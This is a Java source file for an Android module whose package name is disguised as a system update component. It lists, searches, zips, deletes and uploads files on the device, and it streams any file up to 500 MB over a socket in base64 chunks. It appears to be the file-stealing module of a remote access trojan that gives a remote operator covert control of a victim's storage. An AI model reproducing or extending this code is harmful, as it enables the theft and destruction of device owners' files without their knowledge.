package com.android.system.update.modules;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;
import android.webkit.MimeTypeMap;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import org.json.JSONArray;
import org.json.JSONObject;
import org.json.JSONException;

public class FileModule {
    private static final String TAG = "FileModule";
    private Context context;
    private static final int MAX_FILE_SIZE = 500 * 1024 * 1024; // 500 MB — chunking handles it now

    // ── Callback interface for streaming file data ───────────────────────────
    public interface ChunkSender {
        void send(String line);
    }

    public FileModule(Context context) {
        this.context = context;
        Log.d(TAG, "FileModule initialized");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // listFiles — unchanged from original
    // ─────────────────────────────────────────────────────────────────────────
    public String listFiles(String path) {
        Log.d(TAG, "========== listFiles called ==========");
        Log.d(TAG, "Requested path: " + path);

        try {
            File dir;
            if (path == null || path.isEmpty() || path.equals("/")) {
                dir = Environment.getExternalStorageDirectory();
                Log.d(TAG, "Using default external storage: " + dir.getAbsolutePath());
            } else {
                dir = new File(path);
                Log.d(TAG, "Using provided path: " + dir.getAbsolutePath());
            }

            Log.d(TAG, "Directory exists: " + dir.exists());
            Log.d(TAG, "Directory can read: " + dir.canRead());
            Log.d(TAG, "Directory is directory: " + dir.isDirectory());
            Log.d(TAG, "Directory absolute path: " + dir.getAbsolutePath());

            if (!dir.exists()) {
                Log.e(TAG, "ERROR: Directory does not exist: " + path);
                return createErrorResponse("Directory does not exist");
            }

            JSONObject result = new JSONObject();
            result.put("current_path", dir.getAbsolutePath());
            result.put("parent_path", dir.getParent() != null ? dir.getParent() : "");
            result.put("success", true);

            JSONArray filesList = new JSONArray();
            boolean filesFound = false;

            // METHOD 1
            if (!filesFound) {
                File[] files = dir.listFiles();
                Log.d(TAG, "Method 1 - listFiles() returned: " + (files == null ? "null" : files.length + " files"));
                if (files != null && files.length > 0) {
                    filesFound = true;
                    for (File file : files) addFileToJSON(file, filesList);
                }
            }

            // METHOD 2
            if (!filesFound) {
                String[] fileNames = dir.list();
                Log.d(TAG, "Method 2 - list() returned: " + (fileNames == null ? "null" : fileNames.length + " files"));
                if (fileNames != null && fileNames.length > 0) {
                    filesFound = true;
                    for (String name : fileNames) addFileToJSON(new File(dir, name), filesList);
                }
            }

            // METHOD 3 — MediaStore for Android 10+
            if (!filesFound && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                Log.d(TAG, "Method 3 - Trying MediaStore API...");
                filesFound = queryMediaStore(dir.getAbsolutePath(), filesList);
            }

            // METHOD 4 — per-type MediaStore
            if (!filesFound) {
                Log.d(TAG, "Method 4 - Checking known folders...");
                String lowerPath = dir.getAbsolutePath().toLowerCase();
                if (lowerPath.contains("/download")) {
                    filesFound = queryMediaStoreByType(MediaStore.Files.getContentUri("external"),
                        MediaStore.Files.FileColumns.DATA + " LIKE ?",
                        new String[]{dir.getAbsolutePath() + "%"}, filesList, dir.getAbsolutePath());
                } else if (lowerPath.contains("/dcim") || lowerPath.contains("/camera")) {
                    filesFound = queryMediaStoreByType(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        MediaStore.Images.Media.DATA + " LIKE ?",
                        new String[]{dir.getAbsolutePath() + "%"}, filesList, dir.getAbsolutePath());
                } else if (lowerPath.contains("/music") || lowerPath.contains("/audio") || lowerPath.contains("/ringtones")) {
                    filesFound = queryMediaStoreByType(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                        MediaStore.Audio.Media.DATA + " LIKE ?",
                        new String[]{dir.getAbsolutePath() + "%"}, filesList, dir.getAbsolutePath());
                } else if (lowerPath.contains("/movies") || lowerPath.contains("/video")) {
                    filesFound = queryMediaStoreByType(MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                        MediaStore.Video.Media.DATA + " LIKE ?",
                        new String[]{dir.getAbsolutePath() + "%"}, filesList, dir.getAbsolutePath());
                }
            }

            if (filesList.length() == 0) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    if (!Environment.isExternalStorageManager()) {
                        result.put("warning", "MANAGE_EXTERNAL_STORAGE permission required for this folder");
                    } else {
                        result.put("warning", "Folder appears to be empty or inaccessible");
                    }
                } else {
                    if (!dir.canRead()) result.put("warning", "Cannot read directory - permission denied");
                }
            }

            result.put("files", filesList);
            result.put("total", filesList.length());
            Log.d(TAG, "Returning " + filesList.length() + " files");
            return result.toString();

        } catch (JSONException e) {
            Log.e(TAG, "JSON error in listFiles", e);
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception in listFiles", e);
            return createErrorResponse("Permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception in listFiles", e);
            return createErrorResponse(e.getMessage());
        }
    }

    private void addFileToJSON(File file, JSONArray filesList) throws JSONException {
        JSONObject fileObj = new JSONObject();
        fileObj.put("name", file.getName());
        fileObj.put("path", file.getAbsolutePath());
        fileObj.put("isDirectory", file.isDirectory());
        fileObj.put("size", file.length());
        fileObj.put("lastModified", file.lastModified());
        fileObj.put("canRead", file.canRead());
        fileObj.put("canWrite", file.canWrite());
        fileObj.put("isHidden", file.isHidden());
        if (!file.isDirectory()) {
            fileObj.put("extension", getFileExtension(file.getName()));
            fileObj.put("mimeType", getMimeType(file.getName()));
        }
        filesList.put(fileObj);
    }

    private boolean queryMediaStore(String folderPath, JSONArray filesList) {
        boolean found = false;
        try {
            ContentResolver resolver = context.getContentResolver();
            Uri uri = MediaStore.Files.getContentUri("external");
            String[] projection = {
                MediaStore.Files.FileColumns._ID,
                MediaStore.Files.FileColumns.DISPLAY_NAME,
                MediaStore.Files.FileColumns.DATA,
                MediaStore.Files.FileColumns.SIZE,
                MediaStore.Files.FileColumns.DATE_MODIFIED,
                MediaStore.Files.FileColumns.MIME_TYPE
            };
            String selection = MediaStore.Files.FileColumns.DATA + " LIKE ? AND " +
                               MediaStore.Files.FileColumns.DATA + " NOT LIKE ?";
            String[] selectionArgs = {folderPath + "/%", folderPath + "/%/%"};
            Cursor cursor = resolver.query(uri, projection, selection, selectionArgs, null);
            if (cursor != null) {
                int nameCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.DISPLAY_NAME);
                int dataCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.DATA);
                int sizeCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.SIZE);
                int dateCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.DATE_MODIFIED);
                int mimeCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.MIME_TYPE);
                while (cursor.moveToNext()) {
                    JSONObject fileObj = new JSONObject();
                    String fileName = cursor.getString(nameCol);
                    String mimeType = cursor.getString(mimeCol);
                    fileObj.put("name", fileName);
                    fileObj.put("path", cursor.getString(dataCol));
                    fileObj.put("isDirectory", false);
                    fileObj.put("size", cursor.getLong(sizeCol));
                    fileObj.put("lastModified", cursor.getLong(dateCol) * 1000);
                    fileObj.put("canRead", true);
                    fileObj.put("canWrite", false);
                    fileObj.put("isHidden", false);
                    fileObj.put("extension", getFileExtension(fileName));
                    fileObj.put("mimeType", mimeType != null ? mimeType : "application/octet-stream");
                    filesList.put(fileObj);
                    found = true;
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "MediaStore query failed", e);
        }
        return found;
    }

    private boolean queryMediaStoreByType(Uri uri, String selection, String[] selectionArgs,
                                          JSONArray filesList, String folderPath) {
        boolean found = false;
        try {
            ContentResolver resolver = context.getContentResolver();
            String[] projection = {
                MediaStore.Files.FileColumns.DISPLAY_NAME,
                MediaStore.Files.FileColumns.DATA,
                MediaStore.Files.FileColumns.SIZE,
                MediaStore.Files.FileColumns.DATE_MODIFIED,
                MediaStore.Files.FileColumns.MIME_TYPE
            };
            Cursor cursor = resolver.query(uri, projection, selection, selectionArgs, null);
            if (cursor != null) {
                int nameCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.DISPLAY_NAME);
                int dataCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.DATA);
                int sizeCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.SIZE);
                int dateCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.DATE_MODIFIED);
                int mimeCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.MIME_TYPE);
                while (cursor.moveToNext()) {
                    String filePath = cursor.getString(dataCol);
                    if (new File(filePath).getParent().equals(folderPath)) {
                        JSONObject fileObj = new JSONObject();
                        String fileName = cursor.getString(nameCol);
                        fileObj.put("name", fileName);
                        fileObj.put("path", filePath);
                        fileObj.put("isDirectory", false);
                        fileObj.put("size", cursor.getLong(sizeCol));
                        fileObj.put("lastModified", cursor.getLong(dateCol) * 1000);
                        fileObj.put("canRead", true);
                        fileObj.put("canWrite", false);
                        fileObj.put("isHidden", false);
                        fileObj.put("extension", getFileExtension(fileName));
                        fileObj.put("mimeType", cursor.getString(mimeCol));
                        filesList.put(fileObj);
                        found = true;
                    }
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "MediaStore query by type failed", e);
        }
        return found;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // getFile — CHUNKED version (replaces the old base64-JSON approach)
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * Streams the file over the socket using FILE_CHUNK protocol.
     * Returns true on success; on error an FILES_ERR| line is already sent.
     */
    public boolean getFile(String path, ChunkSender sender) {
        Log.d(TAG, "getFile (chunked) called for path: " + path);

        try {
            File file = new File(path);

            if (!file.exists()) {
                sender.send("FILES_ERR|" + createErrorResponse("File not found: " + path));
                return false;
            }
            if (!file.canRead()) {
                sender.send("FILES_ERR|" + createErrorResponse("Cannot read file - permission denied"));
                return false;
            }
            if (file.isDirectory()) {
                sender.send("FILES_ERR|" + createErrorResponse("Path is a directory, not a file"));
                return false;
            }
            if (file.length() > MAX_FILE_SIZE) {
                sender.send("FILES_ERR|" + createErrorResponse(
                        "File too large (" + (file.length() / 1024 / 1024) + " MB). Max is 500 MB."));
                return false;
            }

            long fileSize = file.length();
            String fileName = file.getName();
            Log.d(TAG, "Streaming file: " + fileName + " (" + fileSize + " bytes)");

            // START header
            sender.send("FILE_CHUNK|START|" + fileName + "|" + fileSize);

            // DATA chunks — 64 KB raw input → ~88 KB base64 per chunk
            byte[] buffer = new byte[65536];
            try (FileInputStream fis = new FileInputStream(file)) {
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    String chunk = Base64.encodeToString(buffer, 0, bytesRead, Base64.NO_WRAP);
                    sender.send("FILE_CHUNK|DATA|" + chunk);
                    Thread.sleep(5); // throttle identical to video path
                }
            }

            // END marker
            sender.send("FILE_CHUNK|END");
            Log.d(TAG, "Chunked send complete: " + fileName);
            return true;

        } catch (InterruptedException ie) {
            Thread.currentThread().interrupt();
            sender.send("FILES_ERR|" + createErrorResponse("Transfer interrupted"));
            return false;
        } catch (SecurityException se) {
            Log.e(TAG, "Security exception in getFile", se);
            sender.send("FILES_ERR|" + createErrorResponse("Permission denied: " + se.getMessage()));
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Exception in getFile", e);
            sender.send("FILES_ERR|" + createErrorResponse(e.getMessage()));
            return false;
        }
    }

    /**
     * Old single-argument signature — kept so nothing breaks at compile time.
     * Callers that still use this will get an error JSON back.
     */
    public String getFile(String path) {
        return createErrorResponse("Use getFile(path, ChunkSender) for streaming transfers");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // All other methods unchanged from original
    // ─────────────────────────────────────────────────────────────────────────

    public String deleteFile(String path) {
        Log.d(TAG, "deleteFile called for path: " + path);
        try {
            File file = new File(path);
            if (!file.exists()) return createErrorResponse("File not found");
            boolean deleted = file.isDirectory() ? deleteDirectory(file) : file.delete();
            if (deleted) {
                JSONObject response = new JSONObject();
                response.put("success", true);
                response.put("message", "Deleted successfully");
                response.put("path", path);
                return response.toString();
            } else {
                return createErrorResponse("Failed to delete");
            }
        } catch (Exception e) {
            Log.e(TAG, "Exception in deleteFile", e);
            return createErrorResponse(e.getMessage());
        }
    }

    private boolean deleteDirectory(File directory) {
        if (directory.exists()) {
            File[] files = directory.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) deleteDirectory(file);
                    else file.delete();
                }
            }
        }
        return directory.delete();
    }

    public String createFolder(String path, String folderName) {
        Log.d(TAG, "createFolder called - path: " + path + ", folderName: " + folderName);
        try {
            File folder = new File(path, folderName);
            if (folder.exists()) return createErrorResponse("Folder already exists");
            boolean created = folder.mkdirs();
            if (created) {
                JSONObject response = new JSONObject();
                response.put("success", true);
                response.put("message", "Folder created");
                response.put("path", folder.getAbsolutePath());
                return response.toString();
            } else {
                return createErrorResponse("Failed to create folder");
            }
        } catch (Exception e) {
            Log.e(TAG, "Exception in createFolder", e);
            return createErrorResponse(e.getMessage());
        }
    }

    public String renameFile(String oldPath, String newName) {
        Log.d(TAG, "renameFile called - oldPath: " + oldPath + ", newName: " + newName);
        try {
            File oldFile = new File(oldPath);
            File newFile = new File(oldFile.getParentFile(), newName);
            if (newFile.exists()) return createErrorResponse("A file with that name already exists");
            boolean renamed = oldFile.renameTo(newFile);
            if (renamed) {
                JSONObject response = new JSONObject();
                response.put("success", true);
                response.put("message", "Renamed successfully");
                response.put("newPath", newFile.getAbsolutePath());
                return response.toString();
            } else {
                return createErrorResponse("Failed to rename");
            }
        } catch (Exception e) {
            Log.e(TAG, "Exception in renameFile", e);
            return createErrorResponse(e.getMessage());
        }
    }

    public String uploadFile(String path, String fileName, String base64Data) {
        Log.d(TAG, "uploadFile called - path: " + path + ", fileName: " + fileName);
        try {
            File dir = new File(path);
            if (!dir.exists()) dir.mkdirs();
            File file = new File(dir, fileName);
            byte[] bytes = Base64.decode(base64Data, Base64.DEFAULT);
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(bytes);
            fos.close();
            JSONObject response = new JSONObject();
            response.put("success", true);
            response.put("message", "File uploaded");
            response.put("path", file.getAbsolutePath());
            response.put("size", bytes.length);
            return response.toString();
        } catch (Exception e) {
            Log.e(TAG, "Exception in uploadFile", e);
            return createErrorResponse(e.getMessage());
        }
    }

    public String zipFile(String path) {
        Log.d(TAG, "zipFile called for path: " + path);
        try {
            File source = new File(path);
            File zipFile = new File(source.getParent(), source.getName() + ".zip");
            if (zipFile.exists()) zipFile.delete();
            FileOutputStream fos = new FileOutputStream(zipFile);
            ZipOutputStream zos = new ZipOutputStream(fos);
            if (source.isDirectory()) zipDirectory(source, source.getName(), zos);
            else zipFileEntry(source, source.getName(), zos);
            zos.close();
            fos.close();
            JSONObject response = new JSONObject();
            response.put("success", true);
            response.put("message", "Zipped successfully");
            response.put("path", zipFile.getAbsolutePath());
            response.put("size", zipFile.length());
            return response.toString();
        } catch (Exception e) {
            Log.e(TAG, "Exception in zipFile", e);
            return createErrorResponse(e.getMessage());
        }
    }

    private void zipDirectory(File folder, String parentFolder, ZipOutputStream zos) throws Exception {
        File[] files = folder.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) zipDirectory(file, parentFolder + "/" + file.getName(), zos);
                else zipFileEntry(file, parentFolder + "/" + file.getName(), zos);
            }
        }
    }

    private void zipFileEntry(File file, String entryName, ZipOutputStream zos) throws Exception {
        byte[] buffer = new byte[1024];
        FileInputStream fis = new FileInputStream(file);
        zos.putNextEntry(new ZipEntry(entryName));
        int length;
        while ((length = fis.read(buffer)) > 0) zos.write(buffer, 0, length);
        zos.closeEntry();
        fis.close();
    }

    public String searchFiles(String path, String query) {
        Log.d(TAG, "searchFiles called - path: " + path + ", query: " + query);
        try {
            File dir = new File(path);
            if (!dir.exists() || !dir.isDirectory()) return createErrorResponse("Invalid directory");
            JSONArray results = new JSONArray();
            searchInDirectory(dir, query.toLowerCase(), results);
            JSONObject response = new JSONObject();
            response.put("success", true);
            response.put("results", results);
            response.put("count", results.length());
            return response.toString();
        } catch (Exception e) {
            Log.e(TAG, "Exception in searchFiles", e);
            return createErrorResponse(e.getMessage());
        }
    }

    private void searchInDirectory(File dir, String query, JSONArray results) throws Exception {
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File file : files) {
            if (file.getName().toLowerCase().contains(query)) {
                JSONObject fileObj = new JSONObject();
                fileObj.put("name", file.getName());
                fileObj.put("path", file.getAbsolutePath());
                fileObj.put("isDirectory", file.isDirectory());
                fileObj.put("size", file.length());
                fileObj.put("lastModified", file.lastModified());
                results.put(fileObj);
            }
            if (file.isDirectory()) searchInDirectory(file, query, results);
        }
    }

    public String getStorageInfo() {
        Log.d(TAG, "getStorageInfo called");
        try {
            JSONObject info = new JSONObject();
            File internal = Environment.getExternalStorageDirectory();
            if (internal != null) {
                JSONObject internalInfo = new JSONObject();
                internalInfo.put("path", internal.getAbsolutePath());
                internalInfo.put("total", internal.getTotalSpace());
                internalInfo.put("free", internal.getFreeSpace());
                internalInfo.put("used", internal.getTotalSpace() - internal.getFreeSpace());
                info.put("internal", internalInfo);
            }
            File[] externalFiles = context.getExternalFilesDirs(null);
            if (externalFiles.length > 1 && externalFiles[1] != null) {
                JSONObject externalInfo = new JSONObject();
                externalInfo.put("path", externalFiles[1].getAbsolutePath());
                externalInfo.put("available", true);
                info.put("external", externalInfo);
            }
            info.put("success", true);
            return info.toString();
        } catch (Exception e) {
            Log.e(TAG, "Exception in getStorageInfo", e);
            return createErrorResponse(e.getMessage());
        }
    }

    public String testFolder(String path) {
        try {
            if (path == null || path.isEmpty())
                return "Error: No path provided. Usage: test_folder|/path/to/folder";
            File dir = new File(path);
            StringBuilder result = new StringBuilder();
            result.append("Testing folder: ").append(path).append("\n");
            result.append("Exists: ").append(dir.exists()).append("\n");
            result.append("Can read: ").append(dir.canRead()).append("\n");
            result.append("Is directory: ").append(dir.isDirectory()).append("\n");
            result.append("Android API: ").append(Build.VERSION.SDK_INT).append("\n");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                result.append("MANAGE_EXTERNAL_STORAGE: ")
                      .append(Environment.isExternalStorageManager() ? "GRANTED" : "NOT GRANTED")
                      .append("\n");
            }
            if (dir.exists() && dir.isDirectory()) {
                File[] list = dir.listFiles();
                result.append("listFiles() count: ").append(list == null ? "null" : list.length).append("\n");
            }
            return result.toString();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    // ── helpers ──────────────────────────────────────────────────────────────

    private String getFileExtension(String fileName) {
        int lastDot = fileName.lastIndexOf('.');
        if (lastDot > 0 && lastDot < fileName.length() - 1)
            return fileName.substring(lastDot + 1).toLowerCase();
        return "";
    }

    private String getMimeType(String fileName) {
        String extension = getFileExtension(fileName);
        if (extension.isEmpty()) return "application/octet-stream";
        MimeTypeMap mime = MimeTypeMap.getSingleton();
        String type = mime.getMimeTypeFromExtension(extension);
        return type != null ? type : "application/octet-stream";
    }

    private String createErrorResponse(String message) {
        try {
            JSONObject error = new JSONObject();
            error.put("success", false);
            error.put("error", message);
            return error.toString();
        } catch (JSONException e) {
            return "{\"success\":false,\"error\":\"" + message + "\"}";
        }
    }
}
